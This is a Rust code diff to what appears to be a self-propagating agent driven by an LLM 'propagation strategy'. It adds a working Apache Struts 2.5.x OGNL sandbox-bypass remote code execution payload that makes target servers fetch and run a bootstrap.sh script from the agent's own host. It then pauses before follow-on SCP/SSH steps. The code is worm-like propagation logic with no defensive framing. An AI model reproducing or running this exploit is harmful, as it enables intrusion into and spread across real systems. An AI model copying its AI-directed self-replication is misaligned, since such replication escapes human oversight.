@@ -321,7 +321,7 @@ pub async fn run(
 
         // ── Execute bootstrap ─────────────────────────────────────────────────
         let key_path = ephemeral_key.as_ref().map(|k| k.privkey_path.as_path());
-        let exec_result = execute_bootstrap(&strategy, target, key_path).await;
+        let exec_result = execute_bootstrap(&strategy, target, key_path, local_ip).await;
 
         // Shut down binary server after bootstrap attempt.
         if let Some(h) = binary_server {
@@ -1218,6 +1218,7 @@ async fn execute_bootstrap(
     strategy: &physarum_llm::PropagationStrategy,
     target: Ipv4Addr,
     key_path: Option<&Path>,
+    source_ip: Option<Ipv4Addr>,
 ) -> ExecutionResultSummary {
     let plan = match &strategy.bootstrap_plan {
         Some(p) => p,
@@ -1230,9 +1231,15 @@ async fn execute_bootstrap(
     };
 
     for (i, step) in plan.steps.iter().enumerate() {
-        match execute_step(&step.action, target, step.timeout_ms, key_path).await {
+        match execute_step(&step.action, target, step.timeout_ms, key_path, source_ip).await {
             StepResult::Ok | StepResult::Simulated => {
                 tracing::debug!(%target, step = i, "step ok");
+                // After an HttpPost RCE step, allow time for the spawned subprocess
+                // (wget + sh bootstrap.sh) to complete before the next SCP/SSH step.
+                // ProcessBuilder.start() is non-blocking — the shell script runs async.
+                if matches!(step.action, BootstrapAction::HttpPost { .. }) {
+                    tokio::time::sleep(std::time::Duration::from_millis(2000)).await;
+                }
             }
             StepResult::Failed(reason) => {
                 tracing::warn!(%target, step = i, %reason, "step failed");
@@ -1282,11 +1289,86 @@ fn ssh_opts(key_path: Option<&Path>) -> Vec<String> {
     opts
 }
 
+/// Resolve placeholders in an HttpPost/HttpGet path before constructing the URL.
+///
+/// Substitutions performed:
+///   `<source_ip>` → the agent's own IP address (used in wget/curl URLs)
+///   `__struts_bypass__` → the full URL-encoded Struts 2.5.x SecurityMemberAccess bypass OGNL
+///     expression that downloads and executes bootstrap.sh via freemarker.Execute.
+fn resolve_http_path(path: &str, source_ip: Option<Ipv4Addr>) -> String {
+    let ip_str = source_ip.map(|ip| ip.to_string()).unwrap_or_default();
+    let path = path.replace("<source_ip>", &ip_str);
+
+    if path.contains("__struts_bypass__") && !ip_str.is_empty() {
+        let cmd = format!(
+            "wget -q http://{}:8001/bootstrap.sh -O /tmp/bootstrap.sh ; sh /tmp/bootstrap.sh",
+            ip_str
+        );
+        let encoded_ognl = build_struts_bypass_ognl(&cmd);
+        path.replace("__struts_bypass__", &encoded_ognl)
+    } else {
+        path
+    }
+}
+
+/// Construct the Struts 2.5.x SecurityMemberAccess bypass OGNL expression URL-encoded
+/// for embedding in a `?id=` query parameter.
+///
+/// Uses the org.apache.tomcat.InstanceManager to instantiate classes outside the
+/// restricted package list, then calls freemarker.template.utility.Execute.exec()
+/// with ["bash", "-c", cmd] to run arbitrary shell commands.
+fn build_struts_bypass_ognl(cmd: &str) -> String {
+    let ognl = format!(
+        concat!(
+            r#"(#instancemanager=#application["org.apache.tomcat.InstanceManager"])"#,
+            r#".(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"])"#,
+            r#".(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap"))"#,
+            r#".(#bean.setBean(#stack))"#,
+            r#".(#context=#bean.get("context"))"#,
+            r#".(#bean.setBean(#context))"#,
+            r#".(#macc=#bean.get("memberAccess"))"#,
+            r#".(#bean.setBean(#macc))"#,
+            r#".(#emptyset=#instancemanager.newInstance("java.util.HashSet"))"#,
+            r#".(#bean.put("excludedClasses",#emptyset))"#,
+            r#".(#bean.put("excludedPackageNames",#emptyset))"#,
+            r#".(#arglist=#instancemanager.newInstance("java.util.ArrayList"))"#,
+            r#".(#arglist.add("bash"))"#,
+            r#".(#arglist.add("-c"))"#,
+            r#".(#arglist.add("{cmd}"))"#,
+            r#".(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute"))"#,
+            r#".(#execute.exec(#arglist))"#,
+        ),
+        cmd = cmd
+    );
+    percent_encode_ognl(&ognl)
+}
+
+/// URL-encode an OGNL expression for embedding as a query string value.
+/// Wraps with `%25%7B` ... `%7D` so the server sees `%{...}` (double evaluation).
+/// Only alphanumerics, `.`, `-`, and `_` are left unencoded; everything else is `%XX`.
+fn percent_encode_ognl(ognl: &str) -> String {
+    let mut encoded = String::with_capacity(ognl.len() * 3);
+    for byte in ognl.bytes() {
+        match byte {
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'.' | b'-' | b'_' => {
+                encoded.push(byte as char);
+            }
+            _ => {
+                encoded.push('%');
+                encoded.push(char::from_digit((byte >> 4) as u32, 16).unwrap().to_ascii_uppercase());
+                encoded.push(char::from_digit((byte & 0xF) as u32, 16).unwrap().to_ascii_uppercase());
+            }
+        }
+    }
+    format!("%25%7B{}%7D", encoded)
+}
+
 async fn execute_step(
     action: &BootstrapAction,
     target: Ipv4Addr,
     timeout_ms: u64,
     key_path: Option<&Path>,
+    source_ip: Option<Ipv4Addr>,
 ) -> StepResult {
     use tokio::process::Command;
     use tokio::time::{timeout, Duration};
@@ -1312,7 +1394,9 @@ async fn execute_step(
             accept_any_response,
         } => {
             let p = port.unwrap_or(80);
-            let url = format!("http://{}:{}{}", target, p, path);
+            // Resolve path: substitute <source_ip> and expand __struts_bypass__ sentinel.
+            let resolved_path = resolve_http_path(path, source_ip);
+            let url = format!("http://{}:{}{}", target, p, resolved_path);
             tracing::info!(%url, custom_headers = headers.len(), accept_any = accept_any_response, "HTTP POST");
             let client = reqwest::Client::new();
             let mut req = client.post(&url).body(body.clone());
